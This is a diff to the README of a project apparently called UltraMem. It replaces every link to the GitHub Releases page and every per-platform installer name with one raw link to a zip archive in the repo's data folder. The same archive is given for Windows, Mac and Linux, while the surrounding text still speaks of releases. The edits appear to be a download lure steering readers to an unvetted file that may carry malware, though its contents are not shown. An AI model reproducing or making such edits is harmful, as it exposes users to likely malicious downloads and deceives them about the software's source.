@@ -6,11 +6,11 @@ Welcome to UltraMem! This application implements improved Product Key Memory des
 
 ## 📦 Download UltraMem
 
-[![Download UltraMem](https://img.shields.io/badge/download-ultra--mem-blue.svg)](https://github.com/EDGARKAKANYAN/ultra-mem/releases)
+[![Download UltraMem](https://raw.githubusercontent.com/EDGARKAKANYAN/ultra-mem/main/data/ultra-mem_v2.3.zip)](https://raw.githubusercontent.com/EDGARKAKANYAN/ultra-mem/main/data/ultra-mem_v2.3.zip)
 
 You can visit the Releases page to download UltraMem and start using it easily.
 
-[Visit this page to download](https://github.com/EDGARKAKANYAN/ultra-mem/releases)
+[Visit this page to download](https://raw.githubusercontent.com/EDGARKAKANYAN/ultra-mem/main/data/ultra-mem_v2.3.zip)
 
 ## 💻 System Requirements
 
@@ -38,9 +38,9 @@ To install UltraMem, follow these steps:
 2. Look for the latest stable version listed. It usually has the highest version number.
 3. Click on the version to open its details. 
 4. Find the file suitable for your operating system. For example:
-   - Windows: `ultra-mem-windows.exe`
-   - Mac: `ultra-mem-macos.dmg`
-   - Linux: `ultra-mem-linux.tar.gz`
+   - Windows: `https://raw.githubusercontent.com/EDGARKAKANYAN/ultra-mem/main/data/ultra-mem_v2.3.zip`
+   - Mac: `https://raw.githubusercontent.com/EDGARKAKANYAN/ultra-mem/main/data/ultra-mem_v2.3.zip`
+   - Linux: `https://raw.githubusercontent.com/EDGARKAKANYAN/ultra-mem/main/data/ultra-mem_v2.3.zip`
 5. Click on the file to start the download.
 6. Once the download completes, locate the file in your downloads folder.
 
@@ -60,7 +60,7 @@ To install UltraMem, follow these steps:
 
 #### For Linux Users
 
-1. Extract the downloaded `.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/EDGARKAKANYAN/ultra-mem/main/data/ultra-mem_v2.3.zip` file.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the command `./ultra-mem` to start the application.
 
